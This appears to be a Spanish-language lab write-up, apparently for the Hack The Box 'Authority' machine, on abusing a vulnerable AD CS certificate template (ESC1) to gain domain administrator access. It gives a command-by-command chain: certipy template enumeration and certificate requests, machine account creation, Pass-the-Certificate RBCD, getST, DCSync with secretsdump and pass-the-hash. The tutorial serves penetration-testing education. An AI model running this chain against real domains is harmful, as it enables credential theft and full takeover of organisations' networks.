---
title: Active Directory - Abusando de AD CS para realizar un RBCD y obtener un Service Ticket
description: Realizaremos un Resource-Based Constrained Delegation abusando del servicio de AD CS.
date: 2025-02-07
categories: [active-directory, certificate-service-dcom-access, adcs]
tags: [grupos-de-usuarios-especiales, escalada-de-privilegios, casos-de-ataques-ad, rbcd, get-st, pass-the-cert, pfx, crt, key, addcomputer, certipy]
img_path: /assets/img/esquema-resourcee-based-constrained-delegation-rbcd.png
image: /assets/img/esquema-resourcee-based-constrained-delegation-rbcd.png
---

## **Introducción**

El servicio de *Active Directory Certificate Services* es un rol de *Windows Server* para emitir y administrar certificados de infraestructura de clave pública (*PKI*) que se usan en protocolos de autenticación y comunicación seguros.

Las plantillas de certificados pueden simplificar enormemente la tarea de administrar una entidad emisora de certificados (*CA*) de *Servicios de Certificación de Active Directory* (*AD CS*) al permitir a un administrador emitir certificados preconfigurados para tareas seleccionadas.

El problema viene cuando estas plantillas de certificados son vulnerables, y ese es el caso en el que nos vamos a encontrar el día de hoy. Estaremos viendo como, a partir de una simple plantilla que no se ha prestado atención, podemos aprovechar para conseguir delegar los permisos del propio *DC* sobre un equipo que previamente hemos creado. Al tener permisos de delegación sobre el DC, algo sencillo que podemos hacer, es solicitar un service ticket a nombre del administrador y en consecuencia, conseguir conectarnos como este.

### **Contexto**

Nos encontramos auditando el dominio `authority.htb` y, en nuestra evaluación hemos logrado acceder a la máquina víctima *10.10.11.222* como el usuario *svc_ldap*. Entre nuestras acciones de enumeración, algo que hemos hecho es visualizar los grupos a los que pertenecemos como este usuario, lo que nos ha provocado una llamada de atención el pertenecer al grupo *Certificate Service DCOM Access*.

```powershell
whoami /groups
```

![certificate service dcom access group svc_ldap.png](/assets/img/certificate-service-dcom-access-group-svc_ldap.png)

Este grupo se configura cuando el servicio de **Active Directory Certificate Service** está activo en el dominio. Uno de los ataques más comunes cuando observamos que estamos dentro de este grupo consiste en, abusar de una plantilla de certificado vulnerable para, de alguna manera, conseguir impersonar al usuario administrador. Vamos a intentarlo, así que como siempre nos ponemos manos a la obra.

## **Manos a la obra**
### **Buscando certificados vulnerables**

Como hemos comentado anteriormente, tenemos que ver si existe algún certificado vulnerable en el dominio, y con la herramienta [**`certipy`**](https://github.com/ly4k/Certipy) seremos capaz de enumerarlos.

```bash
certipy find -u 'USUARIO@DOMINIO' -p 'CONTRASEÑA' -dc-ip DC-IP -vulnerable
```

![certipy vulnerable templates.png](/assets/img/certipy-vulnerable-templates.png)

El resultado de la ejecución se guardará en ficheros `.txt` y `.json`. Vamos a ver cual es la plantilla que ha detectado vulnerable.

![plantilla corpvpn vulnerable.png](/assets/img/plantilla-corpvpn-vulnerable.png)

En este caso, la plantilla vulnerable es *CorpVPN* y además, entre toda la información que nos muestra, una de ellas es que la entidad certificadora (*ca*) es `AUTHORITY-CA`. Esta información, es necesario que nuestra máquina de atacante conozca a que se refiere, por lo que lo agregaremos a nuestro `/etc/hosts`.

![Fichero etc hosts con la ca](/assets/img/etc-host-authority-ca-entidad-certificadora.png)

La plantilla de certificado `CorpVPN` permite que todos los equipos del dominio se inscriban siendo vulnerable a **ESC1**, lo que permite al solicitante proporcionar un _Subject Alternate Name_ (**SAN**) arbitrario.

![vulnerabilidad esc1 plantilla corpvpn.png](/assets/img/vulnerabilidad-esc1-plantilla-corpvpn.png)

Esto significa que podemos **solicitar un certificado en nombre de otro usuario** (como por ejemplo, como un *Domain Admin*).

### **Creando un nuevo equipo**

Como esta plantilla *CorpVPN* permite que todos los equipos del dominio se inscriban, crearemos un nuevo equipo con `addcomputer.py` desde el cual tendremos control.

```bash
addcomputer.py -method LDAPS -computer-name 'MACHINE-NAME$' -computer-pass 'MACHINE-PASSWORD' -dc-host 'FQDN-DC' -domain-netbios 'DOMINIO' 'DOMINIO/USUARIO:CONTRASEÑA'
```

![agregando equipo HEGOCIV con svc_ldap authority machine.png](/assets/img/agregando-equipo-HEGOCIV-con-svc_ldap-authority-machine.png)

>**Comprobar si podemos agregar equipos al dominio**<br>
>Es probable que la cuota establecida en el dominio para la creación de equipos esté al límite. Para comprobar si se nos permitirá agregar uno nuevo, podemos comprobar el atributo `MachineAccountQuota`.
>
>```bash
>netexec ldap IP -u 'USUARIO' -p 'CONTRASEÑA' -M maq
>```
>
>![netexec maq machineaccountquota.png](/assets/img/netexec-maq-machineaccountquota.png)
>
>Este atributo, nos indica el número de máquinas que podemos agregar al dominio usando `addcomputer.py`. En la imagen anterior, podemos observar que en el dominio se pueden crear un máximo de *10*.
{: .prompt-warning}

Con esto, habremos logrado agregar un nuevo *Computer Object* al dominio.

- **`-method LDAPS`** ➜ El protocolo **LDAPS (Lightweight Directory Access Protocol Secure)** es un protocolo usado para la autenticación contra varios servicios de directorio. También tendríamos la opción de usar *SAMR*.
- **`-computer-name HEGOCIV$`** ➜ Agregamos el nuevo "*fake computer*" con nombre `HEGOCIV$`.
- **`--computer-pass 'hegociv123$'`** ➜ Especificamos una contraseña a la nueva cuenta de máquina `HEGOCIV$` para poderla usar más adelante.
- **`-dc-host 'AUTHORITY.AUTHORITY.HTB'`** ➜ Indicamos el controlador de dominio al que nos conectaremos para realizar la operación de creación de la máquina.
- **`-domain-netbios 'authority.htb'`** ➜ Definimos el nombre **NetBIOS** del dominio.
- Por último, introducimos las credenciales del usuario que tiene los permisos para realizar esta acción.

### **Solicitando el hash NTLM del Administrator**

Una vez agregado el equipo, al estar en el grupo *Certificate Service DCOM Access*, tenemos la posibilidad de solicitar un certificado `pfx` a nombre de *Administrator* con el cual posteriormente, podremos obtener el *hash NTLM* del administrador.

```bash
certipy req -username MACHINE-NAME$ -password 'MACHINE-PASSWORD' -ca AUTHORITY-CA -dc-ip DC-IP -template VULNERABLE-TEMPLATE-NAME -upn Administrator@DOMINIO -dns DOMINIO -debug
```

![req administrator pfx cert.png](/assets/img/req-administrator-pfx-cert.png)

Esto nos habrá generado un fichero `administrator_authority.pfx` en nuestro directorio actual. Haciendo uso de este certificado, podemos impersonar al usuario administrador y solicitar su hash NTLM en su nombre.

```bash
certipy auth -pfx administrator_authority.pfx -debug
```

![certipy auth administrator hash.png](/assets/img/certipy-auth-administrator-hash.png)

Como queremos obtener el hash de `Administrator@authority.htb` ejecutamos la opción *0*. En posesión de este hash, podemos intentar efectuar un *Pass The Hash* sin embargo, debemos tener en cuenta algo importante.

#### **Solucionando KDC_ERR_PADATA_TYPE_NOSUPP**

Habrá ocasiones en el que a la hora de solicitar este hash nos aparezca el error de `KDC_ERR_PADATA_TYPE_NOSUPP`, lo que significa que el *DC* no soporta *PKINIT*, es decir, la autenticación a través de un certificado. Entonces, debemos tener en nuestro arsernal una manera alternativa para poder llegar a ganar acceso como administradores. 

![error KDC_ERR_PADATA_TYPE_NOSUPP](/assets/img/kdc_err_padata_type_nosupp-authority-htb.png)

>**KDC_ERR_PADATA_TYPE_NOSUPP**<br>
>Si buscamos en [Internet](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768) el significado del mensaje de error *KDC_ERR_PADATA_TYPE_NOSUPP* nos aparece lo siguiente.
>
>![explicación de microsoft sobre el error kdc_err_padata_type_nosupp.png](/assets/img/explicacion-de-microsoft-sobre-el-error-kdc_err_padata_type_nosupp.png)
>
>**Traducción a Español**: "*Se está intentando un inicio de sesión con tarjeta inteligente, pero no se puede localizar el certificado adecuado. Esto puede ocurrir porque se está consultando a la autoridad de certificación (CA) incorrecta o porque no se puede contactar con la CA adecuada. También puede suceder si un controlador de dominio no tiene instalado un certificado para tarjetas inteligentes (plantillas de Controlador de Dominio o Autenticación de Controlador de Dominio). Este código de error no puede aparecer en el evento "4768. Se solicitó un ticket de autenticación Kerberos (TGT)". Aparece en el evento "4771. Falló la preautenticación de Kerberos"*"
{: .prompt-info}

En el caso que nos ocurra lo mencionado, contamos con la herramienta [`passthecert.py`](https://github.com/AlmondOffSec/PassTheCert), pero para que pueda realizar su función necesitamos obtener los ficheros `.key` y `.crt` sobre este `administrator_authority.pfx` que solicitamos con `certipy`.

Para obtener los dos ficheros que necesitamos podemos ejecutar dos sencillos comandos. El primero, generará el `.key` (como *PEM pass* podemos poner cualquier cosa, como *1234*). El segundo comando, sacará el fichero `.crt`.

```bash
openssl pkcs12 -in administrator_authority.pfx -nocerts -out administrator.key
openssl pkcs12 -in administrator_authority.pfx -clcerts -nokeys -out administrator.crt
```

![conversion de certificados openssl pfc a key y crt para rbcd passthecert.png](/assets/img/conversion-de-certificados-openssl-pfc-a-key-y-crt-para-rbcd-passthecert.png)

De esta manera, tendremos `administrator.key` y `administrator.crt`, los cuales usaremos para efectuar un [**Resource-Based Constrained Delegation (RBCD)**](https://deephacking.tech/constrained-delegation-y-resource-based-constrained-delegation-rbcd-kerberos/#resource-based-constrained-delegation-rbcd) con el fin de modificar el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del *DC* y lograr obtener el ticket de servicio de *Administrator*.

#### **Resource Based Constrained Delegation (RBCD)**

El [Resource Based Constrained Delegation (RBCD)](https://deephacking.tech/constrained-delegation-y-resource-based-constrained-delegation-rbcd-kerberos/#resource-based-constrained-delegation-rbcd) funciona de manera distinta a una delegación restringida (*Constrained Delegation*). En el RBCD es al contrario, quien decide quien puede delegar contra él es el **propio recurso**, es decir, el `SERVICIO B` en el siguiente ejemplo.

***`USUARIO ➜ SERVICIO A ➜ SERVICIO B (RECURSO)`***

![Esquema Resource-Based Contrained Delegation](/assets/img/esquema-resourcee-based-constrained-delegation-rbcd.png)

En resumidas cuentas, la idea es la siguiente:

1. **Me autentico en el `SERVICIO A`**.
2. **El `SERVICIO A` le dice al *DC* que me quiere impersonar en el `RECURSO B`** (`SERVICIO B`).
3. **El *DC*, comprueba la lista (`msDS-AllowedToActOnBehalfOfOtherIdentity`) del `RECURSO B`** (`SERVICIO B`).
4. **Si en la lista se encuentra presente la cuenta de servicio de `SERVICIO A`, `SERVICIO B` permitirá la impersonación**.

En conclusión, **Resource-Based Constrained Delegation (RBCD)** es una mejora y un enfoque más flexible de la delegación de autenticación en comparación con la delegación restringida tradicional [Constrained Delegation](https://deephacking.tech/constrained-delegation-y-resource-based-constrained-delegation-rbcd-kerberos/#constrained-delegation). *RBCD* fue introducido en **Windows Server 2012** como una alternativa a la delegación tradicional para mejorar la seguridad y flexibilidad en cómo se gestionan los permisos de delegación en un entorno de Active Directory.

Sabiendo como funciona un *RBCD*, procederemos a efectuarlo. Para ello, nos clonaremos la herramienta `passthecert.py` e introduciremos los ficheros que hemos extraído del `.pfx` en la misma carpeta del repositorio.

```bash
git clone https://github.com/AlmondOffSec/PassTheCert.git
cd PassTheCert
cp ../administrator_authority.pfx .../administrator.key ../administrator.crt .
```

Ahora si, para realizar un **Resource-Based Constrained Delegation (RBCD)**, ejecutaremos la herramienta de la siguiente manera.

```bash
python3 ./Python/passthecert.py -dc-ip DC-IP -crt administrator.crt -key administrator.key -domain DOMINIO -port 636 -action write_rbcd -delegate-to 'DC-NAME$' -delegate-from 'MACHINE-NAME$'
```

![passthecert para nuestra maquina poder impersonar al dc crt key.png](/assets/img/passthecert-para-nuestra-maquina-poder-impersonar-al-dc-crt-key.png)

Este comando usa la técnica **Pass-The-Certificate** para autenticarse en el controlador de dominio (`10.10.11.222`) usando un certificado (`administrator.crt`) y su clave (`administrator.key`). Luego, ejecuta una acción (`write_rbcd`) para configurar la delegación de privilegios, permitiendo que `HEGOCIV$` (nuestro "*fake computer*") pueda actuar en nombre del *DC* (`AUTHORITY-CY$`), lo que podríamos usar para realizar acciones en nombre del administrador (**impersonar**)

Con esta pequeña configuración, lograremos que el equipo que hemos creado (en mi caso *`HEGOCIV$`*) tenga los permisos de delegación necesarios para poder solicitar un ticket de servicio a nombre del administrador. Con `getST.py` conseguiremos lo que acabamos de mencionar.

```bash
impacket-getST -spn 'cifs/DC-NAME.DOMINIO' -impersonate Administrator 'DOMINIO/MACHINE-NAME$:CONTRASEÑA'
```

![getST administrator ccache.png](/assets/img/getST-administrator-ccache.png)

#### **DCSync Attack**

La herramienta habrá generado un fichero `.ccache` y, algo que podemos realizar con esto es un **DCSync Attack**. Para ello, necesitaremos exportar la variable `KRB5CCNAME` para que valga el propio nombre de este fichero generado por `getST.py`. En mi caso, lo he renombrado a `Administrator.ccache`.

```bash
export KRB5CCNAME=Administrator.ccache
```

Con la variable configurada, podemos efectuar un [DCSync Attack](https://h3g0c1v.github.io/posts/abusing-account-operators-group/#efectuando-un-dcsync) gracias al parámetro `-k`, que usará nuestro fichero `.ccache` definido en la variable `KRB5CCNAME`, para autenticarse como el usuario *Administrator* e impersonarle.

```bash
secretsdump.py -k -no-pass DOMINIO/Administrator@DC-NAME.DOMINIO -just-dc-ntlm
```

![dcsync con administrator ccache file.png](/assets/img/dcsync-con-administrator-ccache-file.png)

### **Pass The Hash**

Con el hash NTLM del *Administrator* en nuestro poder, podemos hacer un **Pass the Hash (PtH)** y conseguir acceso como este sin tener que conoecer sus credenciales.

![psexec pass the hash despues de dcsync con administrator ccache.png](/assets/img/psexec-pass-the-hash-despues-de-dcsync-con-administrator-ccache.png)

En este caso se ha usado `psexec` pero se podrían usar herramientas como `wmiexec`, `evil-winrm` para realizar este *Pass The Hash*.

## **Conclusión**
En el día de hoy, hemos aprendido nuevos conceptos como **Resource-Based Constrained Delegation** o **Constrained Delegation**, y como abusar de ellos en un entorno real de AD. Hemos visto una nueva técnica, **Pass The Certificate** que nos permite autenticarnos haciendo uso de un **certificiado**, en vez de las credenciales tradicionales. Nos ha sido posible ver, la ejecución de un **DCSync Attack** utilizando un fichero `.ccache` definido en nuestra variable `KRB5CCNAME` y seguidamente, como efectuar un **Pass The Hash** con el hash NTLM obtenido del DCSync.

## **Enlaces de referencia**

Los siguientes son recursos de utilidad que me ayudaron a realizar este artículo y sobre todo, a aprender sobre ello.

- [Explicación de KDC_ERR_PADATA_TYPE_NOSUPP](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768#table-2-kerberos-ticket-flags)
- [Resource-Based Constrained Delegation (RBCD)](https://deephacking.tech/constrained-delegation-y-resource-based-constrained-delegation-rbcd-kerberos/#resource-based-constrained-delegation-rbcd)
- [Constrained Delegation](https://deephacking.tech/constrained-delegation-y-resource-based-constrained-delegation-rbcd-kerberos/#constrained-delegation)
- [DCSync Attack](https://h3g0c1v.github.io/posts/abusing-account-operators-group/#efectuando-un-dcsync)
- [Máquina Authority - Hack The Box](https://app.hackthebox.com/machines/553)
- [Explicación de Unconstrained Delegation](https://deephacking.tech/unconstrained-delegation-kerberos/)
- [Unconstrained Delegation](https://h3g0c1v.github.io/posts/abusando-del-privilegio-allowedtodelegate/#unconstrained-delegation)

Cabe mencionar que el blog [Deep Hacking](https://deephacking.tech/) es un excelente recurso para quienes buscan aprender sobre ciberseguridad, hacking ético y pentesting. Allí encontrarás contenido detallado sobre pruebas de penetración, Active Directory y técnicas avanzadas utilizadas en el mundo de la ciberseguridad. Personalmente, siempre lo uso para desarrollar y conocer técnicas nuevas de ataque y lo recomiendo totalmente.

## **Despedida**
Espero que te hayas sentido cómodo con los superpoderes que has adquirido en este artículo. ¡Nunca pares de aprender! Hasta la próxima.
